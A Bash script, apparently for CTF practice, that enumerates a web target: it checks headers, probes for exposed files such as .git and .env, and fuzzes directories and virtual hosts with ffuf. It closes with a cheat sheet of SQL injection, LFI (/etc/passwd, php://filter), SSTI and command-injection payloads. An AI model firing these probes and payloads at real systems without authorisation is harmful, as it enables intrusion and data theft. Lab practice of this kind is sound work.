#!/usr/bin/env bash
# =============================================================================
#  web_enum.sh - Enum web rápida para CTF
#  Uso: ./web_enum.sh http://10.10.10.10[:porta] [dominio.ctf]
# =============================================================================
U="${1%/}"; D="${2:-}"
[[ -z "$U" ]] && { echo "Uso: $0 <url> [dominio_para_vhost]"; exit 1; }
B='\033[1;34m'; R='\033[1;31m'; N='\033[0m'
h(){ echo -e "\n${B}== $* ==${N}"; }
has(){ command -v "$1" >/dev/null 2>&1; }
SL=/usr/share/seclists
DIRS=$SL/Discovery/Web-Content/raft-medium-directories.txt; [[ -f $DIRS ]] || DIRS=/usr/share/wordlists/dirb/common.txt
FILES=$SL/Discovery/Web-Content/raft-medium-files.txt
VH=$SL/Discovery/DNS/subdomains-top1million-5000.txt

h "Headers / tecnologia"
curl -skI "$U" | grep -iE '^(server|x-powered-by|set-cookie|location|x-generator|via)'
has whatweb && whatweb -a 3 "$U" 2>/dev/null

h "Arquivos clássicos"
for p in robots.txt sitemap.xml .git/HEAD .env .DS_Store backup.zip index.php.bak \
         phpinfo.php server-status admin/ login.php wp-login.php .svn/entries crossdomain.xml; do
  c=$(curl -sk -o /dev/null -w '%{http_code}' "$U/$p")
  [[ "$c" =~ ^(200|301|302|401|403)$ ]] && echo -e "  [$c] $U/$p"
done
[[ $(curl -sk "$U/.git/HEAD") == ref:* ]] && echo -e "${R}[!!!] .git exposto -> git-dumper $U/.git ./repo${N}"

h "Comentários e JS no HTML"
curl -sk "$U" | grep -oE '<!--.*?-->' | head -15
curl -sk "$U" | grep -oE '(src|href)="[^"]+\.js[^"]*"' | head -15

h "Diretórios (ffuf)"
if has ffuf; then
  ffuf -u "$U/FUZZ" -w "$DIRS" -e .php,.txt,.html,.bak -mc 200,204,301,302,307,401,403 \
       -fc 404 -t 60 -s -o ffuf_dirs.json -of json 2>/dev/null
  echo "(ffuf_dirs.json)  - se tudo der 200, filtre o tamanho: -fs <tamanho>"
elif has gobuster; then
  gobuster dir -u "$U" -w "$DIRS" -x php,txt,html,bak -k -t 50 -q
fi

if [[ -n "$D" ]] && has ffuf; then
  h "VHOSTs em $D"
  BASE=$(curl -sk -o /dev/null -w '%{size_download}' -H "Host: nope.$D" "$U")
  ffuf -u "$U" -H "Host: FUZZ.$D" -w "$VH" -fs "$BASE" -t 60 -s
  echo "Achou? -> echo 'IP sub.$D' | sudo tee -a /etc/hosts"
fi

h "Próximos passos manuais"
cat <<'EOF'
  - Parâmetros: ffuf -u 'URL/page.php?FUZZ=1' -w burp-parameter-names.txt -fs <tam>
  - SQLi:  sqlmap -u 'URL?id=1' --batch --dbs   |  sqlmap -r req.txt --batch
  - LFI:   ?page=../../../../etc/passwd  |  php://filter/convert.base64-encode/resource=index.php
  - SSTI:  {{7*7}}  ${7*7}  <%= 7*7 %>   (49 = vulnerável)
  - CMDi:  ;id  |id  `id`  $(id)  %0aid
  - CMS:   wpscan --url URL -e ap,u  |  droopescan scan drupal -u URL
EOF
